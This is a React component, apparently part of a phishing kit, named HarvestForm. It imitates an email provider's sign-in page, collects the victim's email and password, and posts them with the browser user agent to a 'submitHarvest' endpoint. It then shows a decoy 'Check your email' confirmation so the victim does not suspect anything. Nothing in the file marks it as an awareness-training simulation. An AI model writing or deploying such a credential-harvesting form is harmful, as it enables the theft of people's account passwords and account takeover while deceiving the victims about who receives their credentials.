"use client";

import { useState } from "react";
import { api } from "@/lib/api";
import { HarvestResponse } from "@/lib/types";

type Result =
  | { ok: true; data: HarvestResponse }
  | { ok: false; error: string }
  | null;

export function HarvestForm({ provider }: { provider: string }) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [result, setResult] = useState<Result>(null);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setSubmitting(true);
    setResult(null);

    try {
      const data = await api.submitHarvest({
        username,
        password,
        provider,
        user_agent: navigator.userAgent,
      });
      setResult({ ok: true, data });
    } catch (err) {
      setResult({
        ok: false,
        error: err instanceof Error ? err.message : "Submission failed.",
      });
    } finally {
      setSubmitting(false);
    }
  }

  if (result?.ok) {
    return (
      <div className="text-center">
        <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-emerald-100 text-xl dark:bg-emerald-900/40">
          ✓
        </div>
        <h2 className="text-lg font-semibold text-zinc-900 dark:text-zinc-50">
          Check your email
        </h2>
        <p className="mt-2 text-sm text-zinc-500 dark:text-zinc-400">
          {result.data.message}
        </p>
        <p className="mt-1 text-xs text-zinc-400 dark:text-zinc-500">
          Session {result.data.session_id}
        </p>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <div>
        <label
          htmlFor="username"
          className="mb-1 block text-sm font-medium text-zinc-700 dark:text-zinc-300"
        >
          Email
        </label>
        <input
          id="username"
          type="email"
          autoComplete="username"
          required
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          className="h-11 w-full rounded-lg border border-zinc-300 bg-white px-3 text-sm text-zinc-900 outline-none focus:border-zinc-500 focus:ring-2 focus:ring-zinc-200 dark:border-zinc-700 dark:bg-zinc-950 dark:text-zinc-100 dark:focus:ring-zinc-800"
          placeholder="you@gmail.com"
        />
      </div>

      <div>
        <label
          htmlFor="password"
          className="mb-1 block text-sm font-medium text-zinc-700 dark:text-zinc-300"
        >
          Password
        </label>
        <input
          id="password"
          type="password"
          autoComplete="current-password"
          required
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="h-11 w-full rounded-lg border border-zinc-300 bg-white px-3 text-sm text-zinc-900 outline-none focus:border-zinc-500 focus:ring-2 focus:ring-zinc-200 dark:border-zinc-700 dark:bg-zinc-950 dark:text-zinc-100 dark:focus:ring-zinc-800"
          placeholder="••••••••"
        />
      </div>

      {result && !result.ok && (
        <p className="text-sm text-red-600 dark:text-red-400">{result.error}</p>
      )}

      <button
        type="submit"
        disabled={submitting}
        className="flex h-11 w-full items-center justify-center rounded-lg bg-zinc-900 text-sm font-medium text-white transition-colors hover:bg-zinc-700 disabled:cursor-not-allowed disabled:opacity-60 dark:bg-zinc-50 dark:text-zinc-900 dark:hover:bg-zinc-200"
      >
        {submitting ? "Signing in…" : "Sign in"}
      </button>
    </form>
  );
}
